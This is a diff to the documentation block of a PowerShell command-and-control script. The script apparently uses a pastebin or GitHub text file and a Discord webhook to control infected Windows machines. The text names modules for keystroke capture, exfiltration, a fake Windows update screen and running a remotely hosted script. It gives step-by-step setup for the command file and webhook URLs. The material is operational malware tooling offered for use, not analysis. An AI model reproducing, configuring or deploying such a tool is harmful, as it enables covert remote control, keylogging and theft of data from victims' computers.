@@ -4,10 +4,16 @@
 Using a Discord Server Chat and a hosted text file to Act as a Command and Control Platform.
 
 INFORMATION
-This script will wait until it notices a change in the contents of a text file hosted online (eg. github).
+This script will wait until it notices a change in the contents of a text file hosted online (eg. pastebin or github).
 Every 10 seconds it will check a file for a change in the file contents and interpret it as a custom command / module.
 
-** Using github to host your command file will take up to 5 minutes to run each module - Use your own server to host the txt file for instant response **
+** Using github to host your command file will take up to 5 minutes to run each module - Use https://pastebin.com and create an account to make an editable text file **
+
+SETUP
+1. Goto https://pastebin.com and make an account..
+2. create an empty paste/file and copy the RAW url.
+3. change YOUR_FILE_URL to the RAW url  eg. https://pastebin.com/QeCLTdea -OR- http://your.server.ip.here/files/file.txt 
+4. change YOUR_WEBHOOK_URL to your webhook eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
 
 USAGE
 1. Setup the script
@@ -27,10 +33,6 @@ MODULES
 = FakeUpdate : Spoof windows update screen.            
 = CustomCommand : Execute a github file as a script.   
 
-SETUP
-1. change YOUR_GITHUB_FILE_URL to the url for the file that contains the command eg. https://raw.githubusercontent.com/Username/Repo/main/file.txt -OR- http://your.server.ip.here/files/file.txt 
-2. change YOUR_WEBHOOK_URL to your webhook eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
-
 EXTRA
 You can add custom scripting in a secondary hosted file, change YOUR_OTHER_GITHUB_FILE_URL to another text file and add code to it,
 then in the original hosted file save it with 'customcommand' as the contents 
@@ -40,7 +42,7 @@ Save a hosted file contents as 'kill' to stop 'KeyCapture' or 'Exfiltrate' comma
 #>
 
 # Uncomment the lines below and add you details
-# $GHurl = "YOUR GITHUB FILE URL" 
+# $GHurl = "YOUR FILE URL" 
 # $CCurl = "YOUR SECONDARY GITHUB FILE URL"  # (optional)
 # $hookurl = "YOUR WEBHOOK URL"
 
